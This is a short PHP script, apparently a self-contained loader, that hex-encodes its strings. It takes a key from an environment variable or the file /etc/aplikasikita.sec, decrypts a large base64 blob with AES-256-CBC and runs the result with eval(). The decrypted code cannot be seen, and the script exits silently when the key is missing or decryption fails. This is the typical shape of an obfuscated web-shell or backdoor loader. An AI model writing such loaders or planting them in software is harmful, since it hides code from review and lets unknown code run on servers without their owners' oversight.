<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('E/E3WboZIkYb7dnhcXFQAQ==');

$c=base64_decode(

'q/T/EFomaRRytv12tJ3Mm/0EwlqCfI9OtUiLAsAVEw4aUbQM11BnOIuTzNNgwRS98kxzT0sRvksB' .
'sM1K2ntPe2tzeQDaX4gSMUP3agahFFWLwZbEW29plfCIJZyiBW/baqOA5eyRvXV2gI/oCQrTTNAx' .
'0bUjPKyHz+p5Tu71lhTSkPbiAXWxzT1/7jpmXg5z1bu6V11YUaB2Nf5ZqnGLLBzw9wLDT9ki2iDc' .
'6xdimFFmBRpVUYnfacLjX+QUnQ1AuGkhL5Ghqc3TsZXjIgL5yONw5etqMJ0kUwMgjP7VWccJQHsp' .
'vHd5FNS08lR0S1F0ZouDfFjOFnxqWQ5bwMO5eYtQ1kFGu8qrrKoJMO8jK81xNDkkMLok7oYGcTN3' .
'apAiFCvCyjtJDyYMopq5vrUWdFF/i0MQljk/TZCPJ9PoVJco1QLS1RdmMIZ9KxTvsqgDYELzeSrB' .
'VRVWcDkyfv1GjopyVR8ED2bvdVpM5yALa/1l6W8DssDLKt4NNBEtclw5KxvM6vIjPXSjwCNPPh/v' .
'zswqO3kY5xDXD6U3hn79sjcGXYy6kR4c/eINVZ2+PlRd6Wx9HnYtbNsBtc8AqA9mTb+T8HdCYzv3' .
'VHa8JXOjL1i7EvqPGsxsngHkh1+mjRe1VEVa1zO9kEUMf71dg0HCs7i3QytQitJYSXA2UkcezgFr' .
'fNUG+4kVfEYKRnr5JtvRJUMZ03+vUfsmB2t2oGPc+xlbqlB8ulcec5N9Ce5R+vXpmALgrCqF0glf' .
'oINYFtVEwzIO+zdD5PkuSxNU5X6rmQ3V0Xd1402uTUFTVWowcOB628pjWJAcdzQtSfUQMbysiAQ4' .
'kNwt9TDExINhtPYXpl7npQ6OVt3/09qfdsBOMPnK8mnIGpEzj72chz/UIqVtok063E46KjRLb+CQ' .
'G5YQG/2O2Img4A4obFN52hgHrBInW7jcsNh5PiSP4S/v+/X3PlVeWaA3K0cMZWOMzndKjhxYK5HA' .
'TVgWEaH1H4ym87GpGgWwpazv/T56kyEKyfvaEfs7Xdx5wySAJlI6i2gtr4d1qQcsiiTj+inBtO2L' .
'/GuNoNNeYWHMQQ3APzUIfOMSgdKiqSDms6nNvbhHgufb5CrMzSXuS6mPcWwy4u+hsrwphc9qMlik' .
'Og7FZhUE6nWY89gxbdxu7lMggq6h4hU4nuqLeDa3zuZxkEjXXs/0P+pjfmsaaXno0rPGYNuQhlud' .
'GUc90XTSfBuQVB/fb+tDHcgqpX0kTjXjmiTM6lQlBygCWLbbA0iQHLQH10WxjwZxjx83fyESALji' .
'MP/fwsPn8dcD8I+KStl6WAdU/hvRVMf44QZiBj7l1+fsQ5gzuBUIlEGBBW3UsJyjA+5C6eqAwg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

